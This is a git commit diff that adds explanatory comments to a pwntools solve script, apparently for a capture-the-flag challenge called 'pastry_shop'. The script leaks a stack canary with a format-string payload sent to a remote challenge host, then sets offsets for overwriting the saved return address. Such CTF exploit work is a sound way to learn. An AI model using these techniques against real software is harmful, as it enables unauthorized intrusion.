fa4333aaec1f41053ccd95f15ac773e6bfed5342
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 19:38:25 +0200

    Comments
    Added constants for canary and RIP offsets in the exploit.

--- canary/00_pastry_shop/solve.py
+++ canary/00_pastry_shop/solve.py
@@ -3,13 +3,18 @@ from pwn import *
 
 elf = context.binary = ELF('./pastry_shop', checksec=False)
 
+#canary is the 23rd element that gets printed from the stack when using %p... as name
 CANARY_IDX = 23
+#python3 -c "from pwn import *; print(cyclic(200)) + debug to find value that overwrites canary
 OFFSET_TO_CANARY = 72
+#offset to canary + canary (8B) + saved RPB (8B)
+#or padding to canary + canary + cyclic as input, then debug to see what value overwrites RIP
 OFFSET_TO_RIP = 88
 
 p = remote("offsec.m0lecon.it", 13588)
 
 p.recvuntil(b'dear customer?\n')
+#gets canary for this execution
 p.sendline(f"%{CANARY_IDX}$lx".encode())
 leak = p.recvline().strip()
 canary = int(leak, 16)
